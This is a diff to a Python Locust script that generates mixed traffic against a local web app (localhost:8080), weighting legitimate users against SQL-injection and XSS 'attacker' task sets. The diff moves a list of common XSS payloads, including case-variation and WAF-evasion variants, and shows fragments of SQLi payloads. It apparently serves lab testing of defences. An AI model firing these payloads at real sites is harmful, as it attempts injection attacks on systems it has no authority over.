@@ -21,24 +21,20 @@ SQLI_PAYLOADS = [
     "1 UNION SELECT @@version, NULL, NULL, NULL, NULL, LegitimateUser, AttackerUser"
 ]
 
-# Define the ratio of different user types
-# For example, 70% legitimate, 20% SQLi, 10% XSS
-# This is a simple way to combine different HttpUser classes
-# More complex scenarios might involve a custom Environment.
-class WebsiteUser(HttpUser):
-    # Simulate realistic user behavior with varying wait times
-    wait_time = between(1, 5) # Users wait between 1 and 5 seconds between tasks
-
-    # Define the tasks for different user types
-    # The weight determines how often this TaskSet is chosen
-    tasks = {
-        LegitimateUser: 7, # 70% of the time, users will be legitimate
-        SQLiAttacker: 2,   # 20% of the time, users will perform SQLi attacks
-        XSSAttacker: 1,    # 10% of the time, users will perform XSS attacks
-    }
-
-    # Set a host for the Locust run. This can be overridden by --host CLI arg.
-    host = "http://localhost:8080" # Default, will be overridden by Docker Compose
+    # Common XSS payloads for fuzzing
+XSS_PAYLOADS = [
+    "<script>alert(document.domain)</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg/onload=alert(1)>",
+    "';alert(String.fromCharCode(88,83,83))//",
+    "<body onload=alert('XSS')>",
+    "<iframe src=javascript:alert(1)>",
+    "<a href=\"javascript:alert('XSS')\">Click me</a>",
+    "\"--><script>alert(1)</script>",
+    "<script>console.log('XSS')</script>", # Less disruptive, might bypass some WAFs
+    "<sCrIpT>alert(1)</sCrIpT>", # Case variation
+    "data:text/html,<script>alert(1)</script>" # Data URI
+]
 
 # --- Legitimate User Behavior ---
 class LegitimateUser(TaskSet):
@@ -131,20 +127,6 @@ class SQLiAttacker(TaskSet):
         }, name="/rest/user/login/[SQLi_PASSWORD]")
 
 class XSSAttacker(TaskSet):
-    # Common XSS payloads for fuzzing
-    XSS_PAYLOADS = [
-        "<script>alert(document.domain)</script>",
-        "<img src=x onerror=alert(1)>",
-        "<svg/onload=alert(1)>",
-        "';alert(String.fromCharCode(88,83,83))//",
-        "<body onload=alert('XSS')>",
-        "<iframe src=javascript:alert(1)>",
-        "<a href=\"javascript:alert('XSS')\">Click me</a>",
-        "\"--><script>alert(1)</script>",
-        "<script>console.log('XSS')</script>", # Less disruptive, might bypass some WAFs
-        "<sCrIpT>alert(1)</sCrIpT>", # Case variation
-        "data:text/html,<script>alert(1)</script>" # Data URI
-    ]
 
     @task(5)
     def xss_search_fuzzing(self):
@@ -193,3 +175,21 @@ class XSSAttacker(TaskSet):
             "securityAnswer": payload
         }, name="/api/Users/[XSS_SECURITY_ANSWER]")
 
+# Define the ratio of different user types
+# For example, 70% legitimate, 20% SQLi, 10% XSS
+# This is a simple way to combine different HttpUser classes
+# More complex scenarios might involve a custom Environment.
+class WebsiteUser(HttpUser):
+    # Simulate realistic user behavior with varying wait times
+    wait_time = between(1, 5) # Users wait between 1 and 5 seconds between tasks
+
+    # Define the tasks for different user types
+    # The weight determines how often this TaskSet is chosen
+    tasks = {
+        LegitimateUser: 7, # 70% of the time, users will be legitimate
+        SQLiAttacker: 2,   # 20% of the time, users will perform SQLi attacks
+        XSSAttacker: 1,    # 10% of the time, users will perform XSS attacks
+    }
+
+    # Set a host for the Locust run. This can be overridden by --host CLI arg.
+    host = "http://localhost:8080" # Default, will be overridden by Docker Compose
